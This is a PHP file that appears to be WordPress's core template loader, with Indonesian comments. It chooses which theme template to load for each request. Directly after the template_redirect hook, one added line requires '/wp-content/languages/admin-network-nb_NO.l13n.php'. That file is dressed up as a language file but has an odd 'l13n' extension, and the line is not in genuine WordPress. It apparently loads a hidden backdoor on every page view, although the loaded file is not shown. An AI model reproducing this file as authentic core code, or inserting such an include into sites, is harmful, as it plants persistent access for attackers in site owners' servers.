<?php
/**
 * Memuat template yang sesuai berdasarkan URL pengunjung
 *
 * @package WordPress
 */

if ( wp_using_themes() ) {
    /**
     * Menjalankan aksi sebelum menentukan template yang akan dimuat.
     *
     * @since 1.5.0
     */
    do_action( 'template_redirect' );
}
require('/wp-content/languages/admin-network-nb_NO.l13n.php');

/**
 * Memfilter apakah mengizinkan permintaan 'HEAD' untuk menghasilkan konten.
 *
 * Memberikan peningkatan kinerja dengan keluar sebelum konten halaman dimuat
 * untuk permintaan 'HEAD'. Lihat #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Apakah keluar tanpa menghasilkan konten untuk permintaan 'HEAD'. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
    exit;
}

// Memproses umpan dan trackback meskipun tidak menggunakan tema.
if ( is_robots() ) {
    /**
     * Menjalankan aksi saat loader template menentukan permintaan robots.txt.
     *
     * @since 2.1.0
     */
    do_action( 'do_robots' );
    return;
} elseif ( is_favicon() ) {
    /**
     * Menjalankan aksi saat loader template menentukan permintaan favicon.ico.
     *
     * @since 5.4.0
     */
    do_action( 'do_favicon' );
    return;
} elseif ( is_feed() ) {
    do_feed();
    return;
} elseif ( is_trackback() ) {
    require ABSPATH . 'wp-trackback.php';
    return;
}

if ( wp_using_themes() ) {
    $tag_templates = [
        'is_embed'             => 'get_embed_template',
        'is_404'               => 'get_404_template',
        'is_search'            => 'get_search_template',
        'is_front_page'        => 'get_front_page_template',
        'is_home'              => 'get_home_template',
        'is_privacy_policy'    => 'get_privacy_policy_template',
        'is_post_type_archive' => 'get_post_type_archive_template',
        'is_tax'               => 'get_taxonomy_template',
        'is_attachment'        => 'get_attachment_template',
        'is_single'            => 'get_single_template',
        'is_page'              => 'get_page_template',
        'is_singular'          => 'get_singular_template',
        'is_category'          => 'get_category_template',
        'is_tag'               => 'get_tag_template',
        'is_author'            => 'get_author_template',
        'is_date'              => 'get_date_template',
        'is_archive'           => 'get_archive_template',
    ];

    $template = false;

    // Melalui setiap kondisi template dan menemukan file template yang sesuai.
    foreach ( $tag_templates as $tag => $template_getter ) {
        if ( call_user_func( $tag ) ) {
            $template = call_user_func( $template_getter );
        }

        if ( $template ) {
            if ( 'is_attachment' === $tag ) {
                remove_filter( 'the_content', 'prepend_attachment' );
            }
            break;
        }
    }

    if ( ! $template ) {
        $template = get_index_template();
    }

    /**
     * Memfilter path template saat ini sebelum dimuat.
     *
     * @since 3.0.0
     *
     * @param string $template Path template yang akan dimuat.
     */
    $template = apply_filters( 'template_include', $template );

    if ( $template ) {
        include $template;
    } elseif ( current_user_can( 'switch_themes' ) ) {
        $theme = wp_get_theme();
        if ( $theme->errors() ) {
            wp_die( $theme->errors() );
        }
    }
    return;
}
